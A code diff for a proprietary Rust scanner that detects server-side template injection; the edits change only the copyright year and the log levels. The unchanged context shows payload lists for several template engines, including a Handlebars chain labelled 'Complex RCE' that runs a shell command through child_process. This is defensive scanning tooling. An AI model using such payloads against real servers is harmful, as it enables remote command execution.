@@ -1,4 +1,4 @@
-// Copyright (c) 2025 Bountyy Oy. All rights reserved.
+// Copyright (c) 2026 Bountyy Oy. All rights reserved.
 // This software is proprietary and confidential.
 
 /**
@@ -15,7 +15,7 @@
  * - Template context manipulation
  * - Polyglot SSTI payloads
  *
- * @copyright 2025 Bountyy Oy
+ * @copyright 2026 Bountyy Oy
  * @license Proprietary
  */
 
@@ -99,7 +99,7 @@ impl SstiAdvancedScanner {
         let mut vulnerabilities = Vec::new();
         let tests_run = 15;
 
-        info!("Testing Jinja2 SSTI payloads");
+        debug!("Testing Jinja2 SSTI payloads");
 
         let variable_interpolation = format!("{{{{{}}}}}", self.test_marker);
         let jinja2_payloads = vec![
@@ -135,7 +135,7 @@ impl SstiAdvancedScanner {
         let mut vulnerabilities = Vec::new();
         let tests_run = 12;
 
-        info!("Testing Twig SSTI payloads");
+        debug!("Testing Twig SSTI payloads");
 
         let twig_payloads = vec![
             ("{{7*7}}", "49", "Basic arithmetic"),
@@ -167,7 +167,7 @@ impl SstiAdvancedScanner {
         let mut vulnerabilities = Vec::new();
         let tests_run = 10;
 
-        info!("Testing Freemarker SSTI payloads");
+        debug!("Testing Freemarker SSTI payloads");
 
         let freemarker_payloads = vec![
             ("${7*7}", "49", "Basic arithmetic"),
@@ -197,7 +197,7 @@ impl SstiAdvancedScanner {
         let mut vulnerabilities = Vec::new();
         let tests_run = 8;
 
-        info!("Testing Velocity SSTI payloads");
+        debug!("Testing Velocity SSTI payloads");
 
         let velocity_payloads = vec![
             ("#set($x=7*7)$x", "49", "Basic arithmetic"),
@@ -225,7 +225,7 @@ impl SstiAdvancedScanner {
         let mut vulnerabilities = Vec::new();
         let tests_run = 10;
 
-        info!("Testing Handlebars SSTI payloads");
+        debug!("Testing Handlebars SSTI payloads");
 
         let handlebars_payloads = vec![
             ("{{#with \"s\" as |string|}}\n{{#with \"e\"}}\n{{#with split as |conslist|}}\n{{this.pop}}\n{{this.push (lookup string.sub \"constructor\")}}\n{{this.pop}}\n{{#with string.split as |codelist|}}\n{{this.pop}}\n{{this.push \"return require('child_process').exec('id');\"}}\n{{this.pop}}\n{{#each conslist}}\n{{#with (string.sub.apply 0 codelist)}}\n{{this}}\n{{/with}}\n{{/each}}\n{{/with}}\n{{/with}}\n{{/with}}\n{{/with}}", "uid=", "Complex RCE"),
@@ -255,7 +255,7 @@ impl SstiAdvancedScanner {
         let mut vulnerabilities = Vec::new();
         let tests_run = 8;
 
-        info!("Testing Pug (Jade) SSTI payloads");
+        debug!("Testing Pug (Jade) SSTI payloads");
 
         let pug_payloads = vec![
             ("#{7*7}", "49", "Basic arithmetic"),
@@ -283,7 +283,7 @@ impl SstiAdvancedScanner {
         let mut vulnerabilities = Vec::new();
         let tests_run = 6;
 
-        info!("Testing polyglot SSTI payloads");
+        debug!("Testing polyglot SSTI payloads");
 
         let polyglot_marker = format!("${{{{{}}}}}", self.test_marker);
         let polyglot_payloads = vec![
